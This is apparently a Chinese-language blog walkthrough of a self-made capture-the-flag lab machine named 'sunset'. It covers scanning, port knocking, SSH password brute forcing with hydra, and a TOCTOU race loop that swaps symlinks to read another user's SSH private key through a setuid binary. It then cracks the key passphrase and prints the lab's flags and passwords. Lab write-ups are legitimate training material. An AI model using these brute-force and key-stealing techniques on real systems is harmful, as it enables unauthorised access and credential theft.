{"pageProps":{"postData":{"id":"Personalsunset","contentHtml":"<h1>sunset</h1>\n<h2>Recon</h2>\n<pre><code class=\"hljs language-bash\">➜  sunset nmap -sn 192.168.56.0/24                \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 00:47 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00033s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00017s latency).\nMAC Address: 08:00:27:A0:BB:26 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.73\nHost is up (0.00023s latency).\nMAC Address: 08:00:27:F3:E2:F2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>\n<p>仅开启 <code>80</code> 端口</p>\n<pre><code class=\"hljs language-bash\">➜  sunset nmap -sT -min-rate 10000 192.168.56.73  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 00:47 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.73\nHost is up (0.00082s latency).\nNot shown: 999 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 08:00:27:F3:E2:F2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 13.50 seconds\n</code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p>访问 <code>HTTP</code> 服务</p>\n<p>是一个剧情的序章，剧情根据 《秽翼的尤斯蒂娅》 改的</p>\n<p><img src=\"/post-images/Personalsunset/image.png\" alt=\"image.png\"></p>\n<p>但是除了序章就没别的内容给，我们对其进行目录扫描</p>\n<pre><code class=\"hljs language-bash\">➜  ~ dirsearch -u http://192.168.56.73 -e php,txt,zip -x 403,404,503\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/reports/http_192.168.56.73/_25-06-10_00-50-32.txt\n\nTarget: http://192.168.56.73/\n\n[00:50:32] Starting: \n[00:50:37] 200 -    2KB - /1.txt\n[00:51:12] 200 -   24B  - /robots.txt\n\nTask Completed\n</code></pre>\n<p><code>1.txt</code> 是台词（用于快速阅读）</p>\n<p><img src=\"/post-images/Personalsunset/image1.png\" alt=\"image.png\"></p>\n<p><code>/robots.txt</code> 告诉我们目录中存在 <code>CaimAstraea'sLetter.txt</code></p>\n<p><img src=\"/post-images/Personalsunset/image2.png\" alt=\"image.png\"></p>\n<p><code>CaimAstraea'sLetter.txt</code> 大概是告诉我们，我们要去<code>DesolateBeauty</code> 地盘也就是目录</p>\n<p><img src=\"/post-images/Personalsunset/image3.png\" alt=\"image.png\"></p>\n<p><code>DesolateBeauty</code> 又是一段剧情，并提示我们需要敲门（knock），那么应该就是端口敲门，并且要我们到<code>RustlessGoldlock</code> 里找到端口敲门的线索</p>\n<p><img src=\"/post-images/Personalsunset/image4.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/Personalsunset/image5.png\" alt=\"image.png\"></p>\n<h3>端口敲门 Knockd</h3>\n<p>对 <code>RustlessGoldlock</code> 进行搜寻</p>\n<p>在开发者控制台中能找到 <code>key2=2333</code></p>\n<p><img src=\"/post-images/Personalsunset/image6.png\" alt=\"image.png\"></p>\n<p>目录扫描能扫描到 <code>key.zip</code> ,解压后能得到<code>key1=7000</code></p>\n<p><img src=\"/post-images/Personalsunset/image7.png\" alt=\"image.png\"></p>\n<p>最后<code>key</code>能在背景图中能找到 <code>key3 = 2131</code></p>\n<p>根据线索端口敲门</p>\n<p><img src=\"/post-images/Personalsunset/image8.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">knock 192.168.56.78 7000 2333 2131\n</code></pre>\n<p>敲门后我们再对其进行端口扫描，可以发现多出了一个<code>ssh</code>端口</p>\n<pre><code class=\"hljs language-bash\">➜  ~ nmap -sT -min-rate 10000 192.168.56.78\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 10:32 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.78\nHost is up (0.00040s latency).\nNot shown: 998 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:4C:98:9C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 13.48 seconds\n</code></pre>\n<h3>SSH 爆破</h3>\n<p>那么这里<code>ssh</code>就是被锁着房子，这里我们拥有的用户名有<code>caim</code>和<code>eric</code>，根据剧情，我们以<code>caim</code>用户去爆破</p>\n<p>很快就能爆破出来</p>\n<pre><code class=\"hljs language-bash\">➜  ~ hydra -l caim -P /usr/share/wordlists/rockyou.txt -t 12 192.168.56.78 ssh\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-10 10:34:44\n[WARNING] Many SSH configurations <span class=\"hljs-built_in\">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 12 tasks per 1 server, overall 12 tasks, 14344399 login tries (l:1/p:14344399), ~1195367 tries per task\n[DATA] attacking ssh://192.168.56.78:22/\n[22][ssh] host: 192.168.56.78   login: caim   password: hannah\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-10 10:35:07\n</code></pre>\n<p><code>caim</code>用户家目录下能拿到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">caim@Prison:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nflag{user-29988429c481f219b8c5ba8c071440e1}\n</code></pre>\n<h2>权限提升</h2>\n<h3>TOCTOU</h3>\n<p><code>caim</code>用户家目录下的文件</p>\n<pre><code class=\"hljs language-bash\">caim@Prison:~$ <span class=\"hljs-built_in\">ls</span>\nInfo.txt  ReadHeart  ReadHeart.c  user.txt\n</code></pre>\n<p><code>Info.txt</code> 使我们下一步要做的事</p>\n<pre><code class=\"hljs language-bash\">caim@Prison:~$ <span class=\"hljs-built_in\">cat</span> Info.txt \n「凯伊姆进了房子，艾莉丝坐在椅子上，双目无神，看不到一点生机」\n「カイムが部屋に入ると、エリスは椅子に座り、虚ろな目をしており、生気のかけらもなかった」\n「As caim entered the room, eric was sitting on a chair, her eyes vacant, not a trace of life within them.」\n\n「这时候你突然地意识到，艾莉丝又变回了刚赎身时什么都不懂的『人形』」\n「そのとき、あなたはふと気づく。エリスが身請けされたばかりの頃の、何も知らない『人形』に戻ってしまっていることに」\n「At that moment, you suddenly realize that eric has reverted into the <span class=\"hljs-string\">'doll'</span> she was when she had just been redeemed—knowing nothing.」\n\n「你发现艾莉丝的脖子上的吊坠（ReadHeart）能发出只有提亚才能发出的『终焉的晚霞』的光芒」\n「そしてあなたは気づく。エリスの首にかかるペンダント（ReadHeart）が、ティアだけが放つことのできる『終焉の夕焼け』の光を放っていることに」\n「Then you notice it—the pendant (ReadHeart) on eric’s neck is emitting the glow of the <span class=\"hljs-string\">'Final Sunset,'</span> a light that only Tia could release.」\n\n「你握住它，你仿佛坠入了深海里，里面都是艾莉丝的回忆，这是你能找回原本的艾莉丝的唯一的机会」\n「それに触れた瞬間、あなたはまるで深海に沈むような感覚に包まれる。その中はエリスの記憶で満ちている。これが、かつての本当のエリスを取り戻す唯一の機会なのだ」\n「As you grasp it, you feel as though you’re sinking into the deep sea—filled with eric’s memories. This is your one and only chance to bring back the real eric.」\n</code></pre>\n<p>大概就是运行<code>ReadHeart</code> 去找回艾莉丝</p>\n<pre><code class=\"hljs language-bash\">caim@Prison:~$ <span class=\"hljs-built_in\">cat</span> ReadHeart.c\nNot Here.\n</code></pre>\n<p>发现<code>ReadHeart</code> 能读取文件，并且拥有 <code>eric</code> 的<code>sid</code> 权限</p>\n<pre><code class=\"hljs language-bash\">caim@Prison:~$ <span class=\"hljs-built_in\">ls</span> -al ReadHeart\n-rwsr-sr-x 1 eric eric 16464 Jun  9 08:10 ReadHeart\n</code></pre>\n<pre><code class=\"hljs language-bash\">caim@Prison:~$ ./ReadHeart /etc/passwd\nIs this eric?\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n<span class=\"hljs-built_in\">sync</span>:x:4:65534:<span class=\"hljs-built_in\">sync</span>:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:100:107::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin\nsshd:x:102:65534::/run/sshd:/usr/sbin/nologin\ncaim:x:1000:1000:Caim Astraea,,,:/home/caim:/bin/bash\neric:x:1001:1001:Eris Floralia:/home/eric:/bin/bash\n</code></pre>\n<p>但是读取不了自己的权限以外的东西，我们将其拉出来进行逆向</p>\n<pre><code class=\"hljs language-bash\">int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char v4[1024]; // [rsp+10h] [rbp-4B0h] BYREF\n  struct <span class=\"hljs-built_in\">stat</span> buf; // [rsp+410h] [rbp-B0h] BYREF\n  int v6; // [rsp+4A0h] [rbp-20h]\n  int fd; // [rsp+4A4h] [rbp-1Ch]\n  _BOOL4 v8; // [rsp+4A8h] [rbp-18h]\n  _BOOL4 v9; // [rsp+4ACh] [rbp-14h]\n  __int128 v10; // [rsp+4B0h] [rbp-10h]\n\n  <span class=\"hljs-keyword\">if</span> ( argc == 2 )\n  {\n    <span class=\"hljs-keyword\">if</span> ( access(argv[1], 0) )\n    {\n      puts(<span class=\"hljs-string\">\"Didn't find Eric\"</span>);\n      <span class=\"hljs-built_in\">return</span> 1;\n    }\n    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> ( getuid() == 1000 )\n    {\n      *((_QWORD *)&#x26;v10 + <span class=\"hljs-number\">1</span>) = strstr(argv[<span class=\"hljs-number\">1</span>], \"flag\");\n      *(_QWORD *)&#x26;v10 = strstr(argv[<span class=\"hljs-number\">1</span>], \"id_rsa\");\n      if ( lstat(argv[<span class=\"hljs-number\">1</span>], &#x26;buf) )\n      {\n        perror(\"lstat failed\");\n        return <span class=\"hljs-number\">1</span>;\n      }\n      else\n      {\n        v9 = (buf.st_mode &#x26; <span class=\"hljs-number\">0</span>xF000) == <span class=\"hljs-number\">40960</span>;\n        v8 = access(argv[<span class=\"hljs-number\">1</span>], <span class=\"hljs-number\">4</span>) == <span class=\"hljs-number\">0</span>;\n        usleep(<span class=\"hljs-number\">0</span>x2710u);\n        if ( v10 == <span class=\"hljs-number\">0</span> &#x26;&#x26; !v9 &#x26;&#x26; v8 )\n        {\n          puts(\"Is this eric?\\n\");\n          fd = open(argv[<span class=\"hljs-number\">1</span>], <span class=\"hljs-number\">0</span>);\n          if ( fd >= <span class=\"hljs-number\">0</span> )\n          {\n            do\n            {\n              v6 = read(fd, v4, <span class=\"hljs-number\">0</span>x400uLL);\n              if ( v6 > <span class=\"hljs-number\">0</span> )\n                write(<span class=\"hljs-number\">1</span>, v4, v6);\n            }\n            while ( v6 > <span class=\"hljs-number\">0</span> );\n            close(fd);\n            return <span class=\"hljs-number\">0</span>;\n          }\n          else\n          {\n            perror(\"Didn't find Eric...\");\n            return <span class=\"hljs-number\">1</span>;\n          }\n        }\n        else\n        {\n          puts(\"You can't\");\n          return <span class=\"hljs-number\">1</span>;\n        }\n      }\n    }\n    else\n    {\n      puts(\"Only Caim\");\n      return <span class=\"hljs-number\">1</span>;\n    }\n  }\n  else\n  {\n    puts(\"Usage: ./ReadHeart &#x3C;SomeFile>\");\n    return <span class=\"hljs-number\">1</span>;\n  }\n}\n</code></pre>\n<p>通过<code>AI</code>分析该程序容易被 <code>TOCTOU</code> 攻击利用，<code>Time-of-Check to Time-of-Use</code> (TOCTOU) 漏洞</p>\n<p>程序先用 <code>lstat()</code> 和 <code>access()</code> 做检查，然后调用 <code>usleep(10000)</code> 故意延迟，最后再用 <code>open()</code> 打开文件。这中间的微小时间窗口（甚至更短的窗口，在高速机器上也足以触发）就能让攻击者把检查通过的那个普通文件迅速替换成一个符号链接或者目标敏感文件，从而绕过检查。</p>\n<p>所以我们快速创建文件，然后将文件挂载，又将文件删除，又创建文件…让文件一直变化</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">while</span> <span class=\"hljs-literal\">true</span>; <span class=\"hljs-keyword\">do</span> <span class=\"hljs-built_in\">touch</span> heart; <span class=\"hljs-built_in\">ln</span> -sf /home/eric/.ssh/id_rsa heart; <span class=\"hljs-built_in\">rm</span> heart; <span class=\"hljs-keyword\">done</span> &#x26;\n</code></pre>\n<p>然后我们再写一个循环使用<code>ReadHeart</code>读取私钥，因为成功读取时会输出 “<code>Is this eric?</code>”所以我们根据”<code>this</code>”来筛选，然后判断<code>$finded</code> 是否不为空，不为空则输出结果，为空则继续循环。</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">while</span> <span class=\"hljs-literal\">true</span>; <span class=\"hljs-keyword\">do</span> finded=$(/home/caim/ReadHeart heart | grep -Ev <span class=\"hljs-string\">'this'</span>| grep .);<span class=\"hljs-keyword\">if</span> [[ -n <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$finded</span>\"</span> ]]; <span class=\"hljs-keyword\">then</span> <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$finded</span>\"</span>; <span class=\"hljs-built_in\">break</span>; <span class=\"hljs-keyword\">fi</span>; <span class=\"hljs-keyword\">done</span>\n</code></pre>\n<p><img src=\"/post-images/Personalsunset/image9.png\" alt=\"image.png\"></p>\n<h3>私钥爆破</h3>\n<p>得到私钥后，我们尝试进行登录，需要密码</p>\n<pre><code class=\"hljs language-bash\">➜  Test ssh eric@192.168.56.79 -i <span class=\"hljs-built_in\">hash</span>  \nEnter passphrase <span class=\"hljs-keyword\">for</span> key <span class=\"hljs-string\">'hash'</span>: \n</code></pre>\n<p>使用<code>john</code>将其转为可破解的</p>\n<pre><code class=\"hljs language-bash\">➜  Test ssh2john <span class=\"hljs-built_in\">hash</span> > 1.txt         \n</code></pre>\n<p>破解，得到密码 <code>iloveu</code></p>\n<pre><code class=\"hljs language-bash\">➜  Test john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt           \nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 <span class=\"hljs-keyword\">for</span> all loaded hashes\nCost 2 (iteration count) is 16 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\niloveu           (<span class=\"hljs-built_in\">hash</span>)     \n1g 0:00:00:02 DONE (2025-06-10 11:30) 0.4464g/s 28.57p/s 28.57c/s 28.57C/s 123456..charlie\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<h3>Root</h3>\n<p>来到 <code>eric</code> 的家目录</p>\n<pre><code class=\"hljs language-bash\">eric@Prison:~$ <span class=\"hljs-built_in\">ls</span>\nTheFinalDecision\n</code></pre>\n<p>只有一个程序，直接运行</p>\n<p>是一串的剧情，两个结局都可以直接拿到 root 的密码</p>\n<pre><code class=\"hljs language-bash\">之后，在凯伊姆的劝说下，艾莉丝和以前一样，一点点的像普通人一样为自己而活\nその後、カイムの説得もあって、エリスは再び少しずつ普通の人のように自分のために生き始めた。\nAfterward, with caim’s encouragement, eric once again began, little by little, to live <span class=\"hljs-keyword\">for</span> herself like an ordinary person.\n\n艾莉丝在牢狱开了间诊所，为牢狱的病人看病，并且有了新目标\nエリスは牢獄に診療所を開き、囚人たちの診療を行い、新たな目標を持った。\nEric opened a clinic <span class=\"hljs-keyword\">in</span> the prison, treated the prisoners, and found a new purpose.\n\n在第五章，叛乱军攻上皇城之际，艾莉丝特意去找凯伊姆将自己赎身的钱给了凯伊姆\n第五章で、反乱軍が皇城に攻め込んだとき、エリスはわざわざカイムのもとを訪れ、自分の身請け金を彼に渡した。\nIn Chapter 5, as the rebel army stormed the royal castle, eric deliberately went to caim and gave him the money <span class=\"hljs-keyword\">for</span> her redemption.\n\n希望在这个战乱的时候能没有遗憾地离开，也为了向凯伊姆展示自己已经成功独立\nこの戦乱の中で、悔いなく去るために。そして、カイムに自分が自立できたことを示すために。\nShe wished to leave without regrets amidst the chaos of war—and to show caim that she had truly become independent.\n\n但是艾莉丝，你真的释怀了吗？\nでも、エリス……本当に心から解放されたのか？\nBut eric... have you truly found peace <span class=\"hljs-keyword\">in</span> your heart?\nThe final password: CialloCiall0\n</code></pre>\n<p>直接切 <code>root</code> ，读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@Prison:~# <span class=\"hljs-built_in\">cat</span> root.txt \nflag{root-35dd4ab1f81016d5eb3b3a5d7494667f}\n</code></pre>\n<h2>总结</h2>\n<p>打过<code>thm</code>的<code>breakme</code> 的可能对提权有印象，因为<code>TOCTOU</code>和那里的很像，我也是在那里学到<code>TOCTOU</code>攻击的</p>","title":"Personal - sunset","date":"2025-06-10","updated":"2025-06-10","tags":["自制","Linux","Knockd","hide","TOCTOU","encrypt"],"categories":"靶机","comments":true,"description":"sunset\n\nRecon\n\n\n\n仅开启 `80` 端口\n\n\n\nWeb 渗透\n\n信息收集\n\n访问 `HTTP` 服务\n\n是一个剧情的序章，剧情根据 《秽翼的尤斯蒂娅》 改的\n\n\n\n但是除了序章就没别的内容给，我们对其进行目录扫描\n\n\n\n`1.txt` 是台词（用于快速阅读）\n\n\n\n`/robots.txt` 告诉我们目录中存在 `CaimAstraea'sLetter.txt`\n\n\n\n`CaimA...","isEncrypted":true},"recentPosts":[{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"HackTheBoxMachine - Scepter","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"}]},"__N_SSG":true}